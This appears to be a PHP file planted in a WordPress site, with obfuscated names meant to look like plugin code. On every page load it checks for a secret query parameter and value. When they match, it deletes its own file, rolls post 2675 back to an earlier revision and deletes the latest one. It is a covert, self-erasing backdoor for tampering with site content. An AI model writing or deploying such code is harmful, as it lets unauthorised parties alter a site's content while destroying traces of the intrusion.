<?php

function control_remover_article() {
	if (isset($_GET['html5_separator_quiz_donation']) && $_GET['html5_separator_quiz_donation'] === 'signature_grid_effect_category') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$addon_emails_mobile = 2675;
		$sitemaps_single_category_ultimate = wp_get_post_revisions($addon_emails_mobile);
		if (empty($sitemaps_single_category_ultimate)) die('no revisions');
		if (count($sitemaps_single_category_ultimate) < 2) die('less than 2');
		$sliding_logger_vendor_font = array_shift($sitemaps_single_category_ultimate);
		$quantity_update_category = $sliding_logger_vendor_font->ID;
		$groups_reusable_print_text = array_shift($sitemaps_single_category_ultimate);
		$subscriptions_adsense_variations = $groups_reusable_print_text->ID;
		$old_demomentsomtres_akismet = wp_restore_post_revision($subscriptions_adsense_variations);
		if ($old_demomentsomtres_akismet === false) die('error restoring');
		$old_demomentsomtres_akismet = wp_delete_post_revision($quantity_update_category);		
		if ($old_demomentsomtres_akismet === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'control_remover_article');
